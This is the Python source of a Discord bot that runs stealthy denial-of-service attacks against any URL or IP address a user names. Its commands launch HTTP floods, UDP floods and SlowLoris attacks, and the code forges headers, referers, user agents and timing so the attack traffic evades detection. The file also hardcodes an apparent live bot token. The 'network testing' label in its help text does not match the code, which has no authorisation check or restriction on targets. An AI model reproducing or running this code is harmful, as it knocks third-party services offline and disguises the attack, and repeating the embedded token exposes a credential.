import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import time
import os
import socket
import struct
import ssl
from aiohttp import ClientTimeout
from fake_useragent import UserAgent

# ===== CONFIGURATION =====
TOKEN = os.getenv('DiscordToken') or "MTM1NTk2Njg5ODI5NDEwMDA1MQ.G2aGLz.RdZGsjbeU2374J8pdoyEG93vGbiIQ9Dn5QP1pM"
MAX_DURATION = 120  
MAX_REQUESTS = 50000  
CONCURRENT_LIMIT = 200  
MAX_PACKET_SIZE = 1400  
REQUEST_DELAY_VARIATION = (0.1, 0.5)  
USER_AGENT_ROTATION = 50  

# ===== STEALTH TECHNIQUES =====
class StealthTechniques:
    @staticmethod
    def get_realistic_user_agent():
        ua = UserAgent()
        return ua.random
    
    @staticmethod
    def generate_legitimate_referer(target_url):
        domains = [
            "google.com", "bing.com", "yahoo.com", 
            "facebook.com", "twitter.com", "reddit.com"
        ]
        return f"https://{random.choice(domains)}/search?q={target_url.split('/')[2]}"
    
    @staticmethod
    def get_realistic_headers(target_url):
        return {
            'User-Agent': StealthTechniques.get_realistic_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': StealthTechniques.generate_legitimate_referer(target_url),
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
    
    @staticmethod
    def random_delay():
        return random.uniform(*REQUEST_DELAY_VARIATION)
    
    @staticmethod
    def get_legitimate_paths():
        return [
            "/", "/index.html", "/home", "/about", "/contact",
            "/products", "/services", "/blog", "/news"
        ]
    
    @staticmethod
    def get_legitimate_query_params():
        params = [
            "id", "page", "view", "sort", "filter",
            "search", "category", "ref", "from"
        ]
        return f"{random.choice(params)}={random.randint(1,100)}"

# ===== BOT SETUP =====
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None
)

# ===== STEALTHY ATTACK CONTROLLERS =====
class HttpFlood:
    def __init__(self):
        self.active = False
        self.stats = {"success": 0, "failed": 0}
        self.timeout = ClientTimeout(total=5)  # More realistic timeout
        self.user_agent_counter = 0
        self.current_user_agent = StealthTechniques.get_realistic_user_agent()
    
    def rotate_user_agent(self):
        self.user_agent_counter += 1
        if self.user_agent_counter >= USER_AGENT_ROTATION:
            self.current_user_agent = StealthTechniques.get_realistic_user_agent()
            self.user_agent_counter = 0
    
    async def make_request(self, session, url):
        try:
            # Rotate user agents periodically
            self.rotate_user_agent()
            
            # Build realistic headers
            headers = StealthTechniques.get_realistic_headers(url)
            headers['User-Agent'] = self.current_user_agent
            
            # Use realistic request patterns
            path = random.choice(StealthTechniques.get_legitimate_paths())
            query = StealthTechniques.get_legitimate_query_params()
            target_url = f"{url.rstrip('/')}{path}?{query}&rand={random.randint(1,1000000)}"
            
            # Randomize between GET and HEAD requests
            method = random.choice(['GET', 'HEAD'])
            
            # Use proper SSL context
            ssl_context = ssl.create_default_context()
            ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
            
            async with session.request(
                method,
                target_url,
                headers=headers,
                timeout=self.timeout,
                ssl=ssl_context
            ) as response:
                # Simulate human-like reading time for successful requests
                if response.status == 200 and method == 'GET':
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                return response.status < 500
        except:
            return False
    
    async def run_flood(self, url, duration, max_requests):
        self.active = True
        start_time = time.time()
        
        # Use realistic connection pool settings
        connector = aiohttp.TCPConnector(
            force_close=False,  # Keep alive looks more natural
            limit=20,  # Limited connection pool
            enable_cleanup_closed=True,
            keepalive_timeout=15,
            ssl=False
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            while (time.time() - start_time < duration and 
                   sum(self.stats.values()) < max_requests and 
                   self.active):
                
                task = asyncio.create_task(self.make_request(session, url))
                task.add_done_callback(self.update_stats)
                
                # Randomized delay between requests
                await asyncio.sleep(StealthTechniques.random_delay())
                await asyncio.wait([task])
        
        return self.stats['success'], self.stats['failed'], time.time() - start_time
    
    def update_stats(self, task):
        if task.result():
            self.stats['success'] += 1
        else:
            self.stats['failed'] += 1
    
    def stop(self):
        self.active = False
        self.stats = {"success": 0, "failed": 0}

class UdpFlood:
    def __init__(self):
        self.active = False
        self.packets_sent = 0
        self.payload_cache = {}
        self.last_packet_time = 0
    
    def get_payload(self, size):
        if size not in self.payload_cache:
            # Create payload that looks like legitimate traffic
            if size <= 512:
                # DNS-like payload
                self.payload_cache[size] = struct.pack('!HHHHHH', random.randint(1, 65535), 256, 1, 0, 0, 0) + os.urandom(size - 12)
            else:
                # QUIC or VPN-like payload
                self.payload_cache[size] = bytes([random.randint(0, 255) for _ in range(size)])
        return self.payload_cache[size]
    
    async def send_udp(self, target_ip, target_port, payload_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Randomize source port
        sock.bind(('0.0.0.0', random.randint(1024, 65535)))
        
        payload = self.get_payload(payload_size)
        delay = StealthTechniques.random_delay()
        
        while self.active:
            try:
                # Randomized delay between packets
                current_time = time.time()
                if current_time - self.last_packet_time < delay:
                    await asyncio.sleep(delay - (current_time - self.last_packet_time))
                
                sock.sendto(payload, (target_ip, target_port))
                self.packets_sent += 1
                self.last_packet_time = time.time()
                delay = StealthTechniques.random_delay()
            except:
                break
        sock.close()
    
    async def run_flood(self, target_ip, target_port, duration, payload_size=512):
        self.active = True
        self.packets_sent = 0
        start_time = time.time()
        
        # Use realistic packet sizes
        payload_size = min(max(payload_size, 64), MAX_PACKET_SIZE)
        
        tasks = []
        for _ in range(min(CONCURRENT_LIMIT, 10)):  # Fewer concurrent streams
            task = asyncio.create_task(
                self.send_udp(target_ip, target_port, payload_size)
            )
            tasks.append(task)
        
        await asyncio.sleep(duration)
        self.stop()
        
        if tasks:
            await asyncio.wait(tasks)
        
        return self.packets_sent, time.time() - start_time
    
    def stop(self):
        self.active = False

class SlowLoris:
    def __init__(self):
        self.active = False
        self.connections = 0
        self.sockets = []
    
    async def slow_connection(self, target_ip, target_port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)  # Longer timeout
            s.connect((target_ip, target_port))
            
            # Use legitimate-looking HTTP request
            headers = [
                f"GET /{random.choice(StealthTechniques.get_legitimate_paths())} HTTP/1.1",
                f"Host: {target_ip}",
                f"User-Agent: {StealthTechniques.get_realistic_user_agent()}",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
                f"Referer: {StealthTechniques.generate_legitimate_referer(target_ip)}",
                "DNT: 1"
            ]
            
            # Send initial headers
            for header in headers[:4]:
                s.send(f"{header}\r\n".encode())
                time.sleep(random.uniform(0.1, 0.5))  # Stagger headers
            
            self.sockets.append(s)
            self.connections += 1
            
            # Keep connection alive with partial headers
            while self.active:
                try:
                    # Send additional headers slowly
                    for header in headers[4:]:
                        s.send(f"{header}\r\n".encode())
                        time.sleep(random.uniform(5, 15))
                    
                    # Occasionally send keep-alive data
                    time.sleep(random.uniform(10, 30))
                    s.send("X-Request-ID: {}\r\n".format(random.randint(1000, 9999)).encode())
                except:
                    break
        except Exception as e:
            pass
    
    async def run_attack(self, target_ip, target_port, duration, num_connections=100):
        self.active = True
        self.connections = 0
        start_time = time.time()
        
        # Stagger connection attempts over time
        connections_per_minute = min(20, num_connections)  # Slow ramp-up
        total_connections = 0
        
        while (time.time() - start_time < duration and 
               total_connections < num_connections and 
               self.active):
            
            tasks = []
            for _ in range(connections_per_minute):
                if total_connections >= num_connections:
                    break
                
                task = asyncio.create_task(
                    self.slow_connection(target_ip, target_port)
                )
                tasks.append(task)
                total_connections += 1
                await asyncio.sleep(random.uniform(0.5, 2.0))  # Natural connection spread
            
            if tasks:
                await asyncio.wait(tasks)
            
            # Gradually increase connection rate
            connections_per_minute = min(connections_per_minute + 5, num_connections - total_connections)
            await asyncio.sleep(5)
        
        # Maintain connections for duration
        await asyncio.sleep(max(0, duration - (time.time() - start_time)))
        self.stop()
        
        return self.connections, time.time() - start_time
    
    def stop(self):
        self.active = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        self.sockets = []

# Initialize controllers
http_controller = HttpFlood()
udp_controller = UdpFlood()
loris_controller = SlowLoris()

# ===== STEALTH COMMANDS =====
@bot.command()
async def http(ctx, url: str, duration: int = 10, max_requests: int = 1000):
    """Start stealth HTTP flood"""
    if not url.startswith(('http://', 'https://')):
        url = f'http://{url}'
    
    if duration > MAX_DURATION:
        return await ctx.send(f"❌ Max duration is {MAX_DURATION} seconds")
    
    await ctx.send(f"🌐 Starting STEALTH HTTP flood to {url} (slow & low)...")
    
    try:
        success, failed, total_time = await http_controller.run_flood(
            url,
            min(duration, MAX_DURATION),
            min(max_requests, MAX_REQUESTS)
        )
        
        rps = success / total_time if total_time > 0 else 0
        await ctx.send(
            f"✅ Stealth HTTP completed in {total_time:.1f}s\n"
            f"• Success: {success:,}\n"
            f"• Failed: {failed:,}\n"
            f"• Requests/s: {rps:,.1f}"
        )
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def udp(ctx, ip: str, port: int, duration: int = 10, size: int = 512):
    """Start stealth UDP flood"""
    if duration > MAX_DURATION:
        return await ctx.send(f"❌ Max duration is {MAX_DURATION} seconds")
    
    if size > MAX_PACKET_SIZE:
        return await ctx.send(f"❌ Max packet size is {MAX_PACKET_SIZE} bytes")
    
    await ctx.send(f"🌧 Starting STEALTH UDP flood to {ip}:{port} (slow drip)...")
    
    try:
        packets, total_time = await udp_controller.run_flood(
            ip,
            port,
            min(duration, MAX_DURATION),
            size
        )
        
        pps = packets / total_time if total_time > 0 else 0
        mbps = (packets * size * 8) / (total_time * 1000000) if total_time > 0 else 0
        await ctx.send(
            f"✅ Stealth UDP completed in {total_time:.1f}s\n"
            f"• Packets sent: {packets:,}\n"
            f"• Packets/s: {pps:,.1f}\n"
            f"• Bandwidth: {mbps:.2f} Mbps"
        )
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def slowloris(ctx, ip: str, port: int = 80, duration: int = 30, conns: int = 100):
    """Start stealth SlowLoris attack"""
    if duration > MAX_DURATION:
        return await ctx.send(f"❌ Max duration is {MAX_DURATION} seconds")
    
    await ctx.send(f"🐢 Starting STEALTH SlowLoris to {ip}:{port}...")
    
    try:
        connections, total_time = await loris_controller.run_attack(
            ip,
            port,
            min(duration, MAX_DURATION),
            min(conns, CONCURRENT_LIMIT)
        )
        
        await ctx.send(
            f"✅ SlowLoris completed in {total_time:.1f}s\n"
            f"• Open connections: {connections:,}\n"
            f"• Duration: {duration}s"
        )
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def stop(ctx):
    """Gracefully stop all attacks"""
    http_controller.stop()
    udp_controller.stop()
    loris_controller.stop()
    await ctx.send("🛑 All attacks stopped gracefully")

@bot.command()
async def help(ctx):
    """Show stealth help menu"""
    embed = discord.Embed(title="Stealth Network Testing Tool", color=0x00aa00)
    
    embed.add_field(
        name="!http <url> [duration=10] [requests=1000]",
        value="Stealth HTTP flood (slow & low)\nExample: `!http http://example.com 20 2000`",
        inline=False
    )
    
    embed.add_field(
        name="!udp <ip> <port> [duration=10] [size=512]",
        value="Stealth UDP flood (slow drip)\nExample: `!udp 192.168.1.1 53 30 128`",
        inline=False
    )
    
    embed.add_field(
        name="!slowloris <ip> [port=80] [duration=30] [conns=100]",
        value="Stealth SlowLoris attack\nExample: `!slowloris example.com 80 60 150`",
        inline=False
    )
    
    embed.add_field(
        name="!stop",
        value="Gracefully stop all attacks",
        inline=False
    )
    
    tips = (
        "🔹 Stealth techniques used:\n"
        "- Realistic traffic patterns\n"
        "- Randomized delays\n"
        "- Legitimate-looking headers\n"
        "- Gradual ramp-up\n"
        "- Connection reuse\n"
        "- Natural packet sizes"
    )
    embed.add_field(name="Stealth Tips", value=tips, inline=False)
    
    limits = (
        f"Max duration: {MAX_DURATION}s\n"
        f"Max requests: {MAX_REQUESTS:,}\n"
        f"Max packet size: {MAX_PACKET_SIZE} bytes\n"
        f"Max connections: {CONCURRENT_LIMIT}"
    )
    embed.set_footer(text=limits)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Stealth bot ready: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="Legitimate Traffic | !help"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("❌ Unknown command. Try `!help`")
    else:
        await ctx.send(f"⚠️ Error: {str(error)}")

# ===== START BOT =====
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Bot failed to start: {str(e)}")